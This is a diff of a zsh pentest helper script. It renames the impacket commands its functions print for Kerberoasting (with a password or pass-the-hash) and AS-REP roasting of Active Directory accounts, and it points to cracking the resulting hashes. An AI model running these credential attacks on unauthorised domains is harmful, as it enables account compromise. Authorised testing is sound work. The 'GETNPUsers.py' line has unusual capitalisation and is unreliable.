@@ -67,12 +67,12 @@ nb-ad-kerb-kerberoast() {
         echo
         __ask "Enter a password for authentication"
         nb-vars-set-pass
-        print -z "impacket-GetUserSPNs -request ${__DOMAIN}/${__USER}:'${__PASS}' -dc-ip ${__DCHOST} -outputfile $(__dcpath)/kerberoast.txt"
+        print -z "GetUserSPNs.py -request ${__DOMAIN}/${__USER}:'${__PASS}' -dc-ip ${__DCHOST} -outputfile $(__dcpath)/kerberoast.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NT:LM hash for authentication"
         __check-hash
-        print -z "sudo impacket-GetUserSPNs -hashes ${__HASH} ${__DOMAIN}/${__USER} -outputfile $(__dcpath)/kerberoast.txt"
+        print -z "sudo GetUserSPNs.py -hashes ${__HASH} ${__DOMAIN}/${__USER} -outputfile $(__dcpath)/kerberoast.txt"
     else
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
     fi
@@ -94,7 +94,7 @@ nb-ad-kerb-asreproast() {
 	__ask "Enter a users wordlist"
   __askpath ul FILE $HOME/desktop/projects/
 
-	print -z "impacket-GetNPUsers -dc-ip ${__DCHOST} ${__DOMAIN}/ -no-pass -usersfile $ul -format hashcat -outputfile $(__dcpath)/asrep-hashes.txt"
+	print -z "GETNPUsers.py -dc-ip ${__DCHOST} ${__DOMAIN}/ -no-pass -usersfile $ul -format hashcat -outputfile $(__dcpath)/asrep-hashes.txt"
 
   __info "You can now crack this hash with mode '18200' using 'nb-crack-list'"
 }
